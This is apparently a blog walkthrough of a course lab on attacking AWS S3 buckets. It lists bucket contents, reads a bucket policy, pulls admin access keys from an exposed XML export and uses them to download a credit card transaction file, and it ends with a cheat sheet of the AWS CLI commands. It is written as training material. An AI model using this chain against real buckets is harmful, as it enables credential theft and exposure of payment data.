---
title: "Intro to AWS & S3 Bucket Attacking"
date: 2025-05-17
draft: false
language: en
featured_image: ../assets/images/posts/s3-bucket-aws.png
summary: A walkthrough of the Intro to AWS Pentesting Attacking S3 Buckets for Credit Card Info
authorimage: ../assets/images/posts/cyber-immuno-fusion.png
categories: Blog
tags: ["AWS Pentesting", "S3", "AWS", "Enumeration"]
---
# Introduction & Context

Hey guys! This write-up is for the S3 Bucket attack for Credit Card info, available [here](https://academy.simplycyber.io/l/pdp/introduction-to-aws-pentesting). If you don't know what that is, it's a full course that teaches you how to hack (ethically of course) AWS, using both automated and manual methods. This particular challenge is focused on S3 bucket enumeartion and we're trying to find exposed credit card information. Before starting this lab, make sure you have the lab ready and note your domain:

```html
http://dev.huge-logistics.com
```

This lab I did end up going down a rabbit hole (definitely overthought this one through), but that was a great learning experience. I'll explain my thought process for those because maybe that will end up being useful for a future task (you never know!). Now into the lab!

# Setup

Now that we have some credential, step 1 is to configure a profile. We have all the information from the previous walkthrough video, so it's just a few quick steps

```bash
aws configure --profile pwn
#Access Key: KEY_VALUE
#Secret Key: SECRET_KEY
#Region: us-east-1
#Output format: json
```

# Admin Path Search

Now this section is a bit of a rabbit hole, so expect a bit of rambling here (you could probably skip this section entirely). I started by trying to look at the original bucket with my new profile, maybe I have access to new files perhaps?

```bash
aws s3 ls s3://dev.huge-logistics.com --profile pwn
```

Nope, there was nothing new in there. How about we check the folders there then? I started by looking into `admin` and we found something interesting.

```bash
aws s3 ls s3://dev.huge-logistics.com/admin/ --profile pwn
2023-10-16 08:08:38          0 
2024-12-02 06:57:44         32 flag.txt
2023-10-16 13:24:07       2425 website_transactions_export.csv
```

That csv file probably is the one we're trying to get for this challenge, so I tried to download it with `aws s3 cp s3://dev.huge-logistics.com/admin/website_transactions_export.csv --profile pwn`. But that was forbidden. For now. So maybe it was time for creative thinking perhaps. The two prefixes `cp` and `ls` are standard kali commands, so I thought maybe I could just `cat` the file out. That didn't work either, but the output of the error message was pretty helpful.

```bash
aws s3 cat s3://dev.huge-logistics.com/admin/flag.txt --profile pwn

usage: aws [options] <command> <subcommand> [<subcommand> ...] [parameters]
To see help text, you can run:

  aws help
  aws <command> help
  aws <command> <subcommand> help

aws: error: argument subcommand: Invalid choice, valid choices are:

ls                                       | website                   
cp                                       | mv                        
rm                                       | sync                      
mb                                       | rb                        
presign                     
```

The one that seemed the most interesting was `mv`. From what it seemed I had download permissions in the main bucket but not in the admin section. So what if I moved the flag from the admin to the main and then download it? I tried `aws s3 mv s3://dev.huge-logistics.com/admin/website_transactions_export.csv .. --profile pwn`. And you know what? Permission denied.

At this point, I felt a little stumped. I could not download read or move the file at all. But there were some other commands I could try. I wasn't going to go try each and everyone though, that's too much. But I did take a look at the cheatsheet and found this command `aws s3api get-bucket-policy --bucket [bucket-name]`.

That command would let me see what I could actually do (or not). So I ran `aws s3api get-bucket-policy --bucket dev.huge-logistics.com` and we got a big json response. But the one I got had a bunch of newlines everywhere, so I asked ChatGPT to clean it up. Here's the critical part:

```json
{
        "Sid": "AllowAllExceptAdmin",
        "Effect": "Allow",
        "Principal": {
          "AWS": [
            "arn:aws:iam::794929857501:user/it-admin",
            "arn:aws:iam::794929857501:user/pam-test"
          ]
        },
        "Action": [
          "s3:Get*",
          "s3:List*"
        ],
        "Resource": [
          "arn:aws:s3:::dev.huge-logistics.com",
          "arn:aws:s3:::dev.huge-logistics.com/*"
        ]
      },
      {
        "Sid": "ExplicitDenyAdminAccess",
        "Effect": "Deny",
        "Principal": {
          "AWS": "arn:aws:iam::794929857501:user/pam-test"
        },
        "Action": "s3:*",
        "Resource": "arn:aws:s3:::dev.huge-logistics.com/admin/*"
      }
```

The only principal allowed to get anything from the admin path would be the `it-admin`. I was denied persmission, so I must be `pam-test`. If that's the case, the policy bans me from doing anything on the bucket. So that's a dead end. I have to find a way to become `it-admin`

# Searching the Migration files

If we do a request into this file directory, we see we know have permissions! Run `aws s3 ls s3://dev.huge-logistics.com/migration-files/ --profile pwn` to check yourself. This must have something good. And it seems like it did. There is a file called `test-export.xml`. Now if you don't know **xml** is a form of storing data in an organized matter, kind of like **json**. So if you find a data file in a directory called migration files, you probably have found something. So I ran `aws s3 cp s3://dev.huge-logistics.com/migration-files/test-export.xml . --profile pwn` and we got some sweet credentials!

```xml
<!-- AWS Production Credentials -->
    <CredentialEntry>
        <ServiceType>AWS IT Admin</ServiceType>
        <AccountID>794929857501</AccountID>
        <AccessKeyID>KEYVALUE.</AccessKeyID>
        <SecretAccessKey>SECRETKEY.</SecretAccessKey>
        <Notes>AWS credentials for production workloads. Do not share these keys outside of the organization.</Notes>
```

Don't share those keys!

# Grabbing the credit card details

Start by configuring a profile with those credentials

```bash
aws configure --profile admin
#Access Key: KEYVALUE
#Secret Key: SECRETKEY
#Region: us-east-1
#Output format: json
```

Now let's try to grab that `csv` file we saw earlier using `aws s3 cp s3://dev.huge-logistics.com/admin/website_transactions_export.csv --profile admin`. And we got it! The flag there is for the platform specifically, add it in and grab those points.

Amazing, we managed to go from a single website to compromosing credit card credentials. That's a long ways and it was actually not too bad (ignoring the little rabit hole). But fun indeed!

# Cheat Sheet

To close off, here's a quick summary of the commands we needed to run to complete this module. If you're ever coming back to this and just need that one command, this is the section to check.

```bash
#Start Up
aws configure --profile pwn
	#Pass in values

#Enumeration of admin
aws s3 ls s3://dev.huge-logistics.com --profile pwn
aws s3 ls s3://dev.huge-logistics.com/admin/ --profile pwn
aws s3api get-bucket-policy --bucket dev.huge-logistics.com

#Enumeration of migration
aws s3 ls s3://dev.huge-logistics.com/migration-files/ --profile pwn
aws s3 cp s3://dev.huge-logistics.com/migration-files/test-export.xml . --profile pwn

#New admin profile
aws configure --profile admin
	#Pass in values

#Grabbing the goods!
aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt --profile admin
aws s3 cp s3://dev.huge-logistics.com/admin/`website_transactions_export.csv --profile admin
```
